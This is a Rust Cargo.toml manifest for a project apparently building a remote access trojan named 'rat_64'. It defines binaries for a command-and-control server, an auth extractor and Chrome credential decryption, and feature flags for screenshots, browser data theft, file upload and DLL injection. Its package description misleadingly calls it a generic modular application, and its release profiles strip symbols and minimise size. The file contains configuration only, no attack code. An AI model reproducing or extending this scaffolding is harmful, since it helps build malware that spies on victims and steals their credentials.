[package]
name = "rat_64"
version = "0.1.0"
edition = "2021"
default-run = "rat_64"
description = "A high-performance Rust application with modular architecture"
license = "MIT"
readme = "README.md"

[workspace]
members = [".", "chrome_decrypt"]
resolver = "2"

[profile.release]
opt-level = 3
lto = "fat"
codegen-units = 1
panic = "abort"
strip = "symbols"
overflow-checks = false
incremental = false
debug = false
rpath = false
# 最適化強化
split-debuginfo = "off"

[profile.dev]
opt-level = 1
debug = true
overflow-checks = true
incremental = true
debug-assertions = true

[profile.release-tiny]
inherits = "release"
opt-level = "z"
lto = "fat" 
codegen-units = 1
panic = "abort"
strip = "symbols"
debug = false
rpath = false
overflow-checks = false
debug-assertions = false
# 超小型化設定
split-debuginfo = "off"

[lib]
name = "rat_64"
path = "src/lib.rs"

[[bin]]
name = "decrypt"
path = "src/bin/decrypt.rs"

[[bin]]
name = "c2_server"
path = "src/bin/c2_server.rs"

[[bin]]
name = "auth_extractor"
path = "src/bin/auth_extractor.rs"

[dependencies]
serde = { version = "1.0", features = ["derive"] }
serde_json = "1.0"

rand = "0.9.2"

# MessagePack（最小機能のみ）
rmp-serde = { version = "1.3", default-features = false }

# 基本ユーティリティ（最小化）
base64 = { version = "0.22", default-features = false, features = ["std"] }

# AEAD（最小機能のみ）
aes-gcm = { version = "0.10", default-features = false, features = ["aes", "alloc"] }

# システム情報（最小化）
anyhow = { version = "1.0", default-features = false }  # エラー処理（最小化）
libloading = { version = "0.8", default-features = false }  # NSSで必要
which = { version = "8.0.0", default-features = false, features = ["real-sys"] }  # NSSで必要
dirs = { version = "6.0.0", default-features = false }  # ディレクトリ検索用

# 条件付き依存関係（機能別）
log = { version = "0.4", default-features = false, optional = true }  # ログ機能
indicatif = { version = "0.18.0", default-features = false, features = ["unicode-width"], optional = true }  # プログレスバー
clap = { version = "4.0", features = ["derive"], optional = true }  # CLI引数解析（inject用）
chrono = { version = "0.4", default-features = false, features = ["clock", "std"] }  # 時刻処理
tokio = { version = "1.0", features = ["rt-multi-thread", "macros", "time", "sync", "signal", "net", "fs"] }  # async runtime（拡張版）  
uuid = { version = "1.0", features = ["v4"] }  # UUID生成
sysinfo = { version = "0.37.1", default-features = false }  # システム情報取得（ハートビート用）
hmac = { version = "0.12", default-features = false }  # HMAC認証（リモートコマンド用）
sha2 = { version = "0.10", default-features = false }  # SHA256ハッシュ（認証用）
# 必須依存関係（最小化）
tempfile = { version = "3.8", default-features = false }
walkdir = { version = "2.3", default-features = false }

# --- For local Hyper test server (bin: c2_server) ---
hyper = { version = "1", features = ["server", "http1"] }
hyper-util = { version = "0.1", features = ["tokio"] }
http-body-util = "0.1"
bytes = "1"
encoding_rs = "0.8.35"
hostname = "0.4"  # ホスト名取得用
num_cpus = "1.0"  # CPU情報取得用

# ---- Feature設定（統一・最適化済み） ----
[features]
# デフォルト設定（最小構成）
default = ["full"]

core = []  # コア機能（常に有効）

# 個別モジュール機能
network = ["dep:minreq"]                                # ネットワーク通信（HTTP、ファイルアップロード）
screenshot = ["dep:image", "dep:scrap"]                   # スクリーンショット機能
browser = ["dep:rusqlite"]                                # ブラウザデータ取得機能

# UI/UX機能
progress-bar = ["dep:indicatif"]                          # プログレスバー表示
logging = ["dep:log"]                                     # ログ機能
datetime = []                                            # 日時処理（常に有効）

# サイズ最適化用機能フラグ
ui-minimal = []                                           # UI要素を最小化（progress-bar除外）
crypto-minimal = []                                       # 暗号化機能を最小化
size-optimized = ["ui-minimal", "crypto-minimal"]        # 総合サイズ最適化

# サーバー診断エンドポイント（任意）
# 有効化時のみ /api/health, /api/network, /api/sysinfo を提供
server_diagnostics = []

# 重複削除：database = browserのエイリアスは不要

# 機能グループ（段階的構成）
basic = ["core", "browser"]
extended = ["basic", "screenshot", "progress-bar"]
full = ["extended", "network", "logging", "inject"]

# 特殊機能
inject = ["dep:clap"]  # DLLインジェクション機能

# optional deps（必要時だけ読み込む）
[dependencies.minreq]
version = "2.12"
default-features = false
features = ["https-rustls"]
optional = true

[dependencies.image]
version = "0.25"
default-features = false
features = ["png"]  # JPEG不要なら削減
optional = true

[dependencies.rusqlite]
version = "0.37.0"
default-features = false
features = ["bundled", "modern_sqlite"]
optional = true

[dependencies.scrap]
version = "0.5"
optional = true

# Windows API（必要最小限のモジュール）
[target.'cfg(windows)'.dependencies]
windows = { version = "0.62.0", default-features = false, features = [
  "Win32_Foundation",
  "Win32_Security_Cryptography",
  "Win32_System_Threading",
  "Win32_System_Memory",
  "Win32_System_Com",
  "Win32_System_Ole",
  "Win32_System_Rpc",
  "Win32_System_Wmi",
  "Win32_System_Variant",
  "Win32_System_Diagnostics",
  "Win32_System_Diagnostics_Debug",
  "Win32_UI_Shell",
  "Win32_UI_Input_KeyboardAndMouse",
  "Win32_UI_WindowsAndMessaging",
  "Win32_System_LibraryLoader",
  "Win32_System_SystemInformation",
  "Win32_Storage_FileSystem",
  "Win32_System_Time",
  "Win32_NetworkManagement_IpHelper",
  "Win32_NetworkManagement_Ndis",
  "Win32_Networking_WinSock",
] }
